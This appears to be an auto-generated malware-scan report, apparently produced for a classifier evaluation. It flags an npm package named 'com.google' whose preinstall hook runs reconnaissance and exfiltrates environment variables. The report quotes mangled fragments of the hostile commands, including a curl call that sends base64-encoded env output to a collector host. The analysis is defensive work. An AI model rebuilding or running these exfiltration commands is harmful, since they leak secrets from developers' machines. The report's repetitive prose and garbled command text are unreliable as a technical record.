# NPM Package Security Analysis Report

## Package Information
- **Package Name:** `com.google`
- **Version:** `0.0.0`
- **Scan Date:** 2026-03-27T14:47:15

---

## Final Security Verdict: **MALICIOUS** (Policy: Blocked)

**Risk Level:** SEV-1 (Critical) **CRITICAL**  
**Confidence Score:** 80.0%

### Executive Summary
The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information. The detected behaviors have no legitimate justification based on the package's stated purpose.

---

## THREAT PROFILE

**ATTACK TYPE:** Credential Theft

**PRIMARY TACTICS:**
- Exfiltration (Network)
- Discovery (System)
- Credential Access

**ATTACK VECTOR IOCs:**
- `ping-c1$BCNET`
- `psaux`
- `foriinenv`
- `psaux`
- `docurlhttps://$BCNET-ski-m30-d"$($i2>&1|base64-w0)`

**KEY RISK FACTORS:**
- The package.json scripts.preinstall hook is executing commands related to network analysis and exfiltration.
- The package.json scripts.preinstall hook is executing commands related to system reconnaissance.
- The package.json scripts.preinstall hook is executing commands related to credential theft.

---

## EVIDENCE SUMMARY

### MALICIOUS INDICATORS DETECTED

#### 1. Network Exfiltration [HIGH]
**Description:** The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain.

```
ping-c1$BCNET
```

#### 2. System Reconnaissance [HIGH]
**Description:** The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment.

```
foriinenv
```

#### 3. Credential Theft [HIGH]
**Description:** The hook is executing commands that involve credential theft. It appears to be accessing sensitive information.

```
docurlhttps://$BCNET-ski-m30-d"$($i2>&1|base64-w0)
```

**Attack Chain:** The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information.

**Legitimacy Assessment:** The package.json scripts.preinstallhook is not justifiable based on the provided evidence.

---

## RECOMMENDATIONS

### Immediate Action
**DO NOT INSTALL — Remove immediately if already installed**

### Remediation Steps
1. Review package source code and dependencies
1. Check for unauthorized access to credentials or secrets
1. Monitor network traffic for suspicious outbound connections
1. Report to npm security team if confirmed malicious

---

## TECHNICAL ANALYSIS DETAILS

**Behaviors Detected:** 3
**Risk Categories:** network_exfiltration, system_reconnaissance, credential_theft
**Highest Detection Confidence:** 83.0%
**Chain Score:** 0.78
**Chain Narrative:** The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information.

---

*Analysis Version: semantic_v2.0*  
*Model: deepseek-coder-6.7b-instruct*  
*Ground Truth Label: malicious*
